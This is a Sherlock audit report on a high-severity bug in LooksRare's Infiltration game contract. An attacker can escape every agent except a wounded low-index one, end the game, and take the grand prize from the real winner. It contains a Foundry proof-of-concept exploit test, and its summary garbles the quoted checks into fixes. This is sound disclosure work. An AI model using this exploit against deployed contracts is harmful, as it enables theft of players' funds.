---
tags:
  - lang/solidity
  - sector/gaming
  - sector/nft
  - sector/nft-marketplace
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/reward-theft
protocol: "[[LooksRare]]"
auditors:
  - "[[0xReiAyanami]]"
  - "[[SilentDefendersOfDeFi]]"
  - "[[cergyk]]"
  - "[[mstpr-brainbot]]"
report: "https://github.com/sherlock-audit/2023-10-looksrare-judging"
genome:
  - "[[wrong-condition]]"
  - "[[reward-theft]]"
  - "[[reward-accounting]]"
  - "[[weak-randomness]]"
  - "[[gamestate-frontrun]]"
---
# H-3: Attacker can steal reward of actual winner by force ending the game

- id: 27588
- impact: HIGH
- protocol: [[LooksRare]]
- reporter: cergyk (Sherlock)
- source: N/A

## Summary


A bug was found in the LooksRare game that allows a malicious user to force win the game and steal the grand prize. This is possible because the winner is determined by the agent index and escaping all agents at once won't kill the wounded agent because the game instantly ends. To fix this, a check should be added inside startNewRound to prevent killing of wounded agents by starting a new round. Additionally, a check should be added inside claimPrize to pay the prize to the first ID agent. A proof of concept was provided to demonstrate the vulnerability. If there are other players with wounded agents but lower than 50 TokenID, they can claim prices for wounded agents, which will break parts of the game logic. To fix this, a new round should be started before the real end of the game to clear all wounded agents and reorder IDs. Manual review and Github PR were used to identify and fix the bug.

## Details

Source: https://github.com/sherlock-audit/2023-10-looksrare-judging/issues/98 

## Found by 
0xReiAyanami, SilentDefendersOfDeFi, cergyk, mstpr-brainbot

A malicious user can force win the game by escaping all but one wounded agent, and steal the grand price.

## Vulnerability Detail

Currently following scenario is possible: 
There is an attacker owning some lower index agents and some higher index agents.
There is a normal user owing one agent with an index between the attackers agents.
If one of the attackers agents with an lower index gets wounded, he can escape all other agents and will instantly win the game,
even if the other User has still one active agent.

This is possible because because the winner is determined by the agent index, 
and escaping all agents at once wont kill the wounded agent because the game instantly ends.

Following check inside startNewRound prevents killing of wounded agents by starting a new round:

```solidity
uint256 activeAgents = gameInfo.activeAgents;
        if (activeAgents == 1) {
            revert GameOver();
        }
```

Following check inside of claimPrize pays price to first ID agent:

```solidity
uint256 agentId = agents[1].agentId;
_assertAgentOwnership(agentId);
```

See following POC:

## POC

Put this into Infiltration.mint.t.sol and run `forge test --match-test forceWin -vvv`

```solidity
function test_forceWin() public {
        address attacker = address(1337);

        //prefund attacker and user1
        vm.deal(user1, PRICE * MAX_MINT_PER_ADDRESS);
        vm.deal(attacker, PRICE * MAX_MINT_PER_ADDRESS);

        // MINT some agents
        vm.warp(_mintStart());
        // attacker wants to make sure he owns a bunch of agents with low IDs!!
        vm.prank(attacker);
        infiltration.mint{value: PRICE * 30}({quantity: 30});
        // For simplicity we mint only 1 agent to user 1 here, but it could be more, they could get wounded, etc.
        vm.prank(user1);
        infiltration.mint{value: PRICE *1}({quantity: 1});
        //Attacker also wants a bunch of agents with the highest IDs, as they are getting swapped with the killed agents (move forward)
        vm.prank(attacker);
        infiltration.mint{value: PRICE * 30}({quantity: 30});
    
        vm.warp(_mintEnd());

        //start the game
        vm.prank(owner);
        infiltration.startGame();

        vm.prank(VRF_COORDINATOR);
        uint256[] memory randomWords = new uint256[](1);
        randomWords[0] = 69_420;
        VRFConsumerBaseV2(address(infiltration)).rawFulfillRandomWords(_computeVrfRequestId(1), randomWords);
        // Now we are in round 2 we do have 1 wounded agent (but we can imagine any of our agent got wounded, doesn´t really matter)
        
        // we know with our HARDCODED RANDOMNESS THAT AGENT 3 gets wounded!!

        // Whenever we get in a situation, that we own all active agents, but 1 and our agent has a lower index we can instant win the game!!
        // This is done by escaping all agents, at once, except the lowest index
        uint256[] memory escapeIds = new uint256[](59);
        escapeIds[0] = 1;
        escapeIds[1] = 2;
        uint256 i = 4; //Scipping our wounded AGENT 3
        for(; i < 31;) {
            escapeIds[i-2] = i;
            unchecked {++i;}
        }
        //skipping 31 as this owned by user1
        unchecked {++i;}
        for(; i < 62;) {
            escapeIds[i-3] = i;
            unchecked {++i;}
        }
        vm.prank(attacker);
        infiltration.escape(escapeIds);

        (uint16 activeAgents, uint16 woundedAgents, , uint16 deadAgents, , , , , , , ) = infiltration.gameInfo();
        console.log("Active", activeAgents);
        assertEq(activeAgents, 1);
        // This will end the game instantly.
        //owner should not be able to start new round
        vm.roll(block.number + BLOCKS_PER_ROUND);
        vm.prank(owner);
        vm.expectRevert();
        infiltration.startNewRound();

        //Okay so the game is over, makes sense!
        // Now user1 has the only active AGENT, so he should claim the grand prize!
        // BUT user1 cannot
        vm.expectRevert(IInfiltration.NotAgentOwner.selector);
        vm.prank(user1);
        infiltration.claimGrandPrize();

        //instead the attacker can:
        vm.prank(attacker);
        infiltration.claimGrandPrize();
        
```

## Impact

Attacker can steal the grand price of the actual winner by force ending the game trough escapes.

This also introduces problems if there are other players with wounded agents but lower < 50 TokenID, they can claim prices 
for wounded agents, which will break parts of the game logic.

## Code Snippet

https://github.com/sherlock-audit/2023-10-looksrare/blob/main/contracts-infiltration/contracts/Infiltration.sol#L589-L592

https://github.com/sherlock-audit/2023-10-looksrare/blob/main/contracts-infiltration/contracts/Infiltration.sol#L656-L672
## Tool used

Manual Review

## Recommendation

Start a new Round before the real end of game to clear all wounded agents and reorder IDs.



## Discussion

**0xhiroshi**

https://github.com/LooksRare/contracts-infiltration/pull/154

**SergeKireev**

Fix LGTM
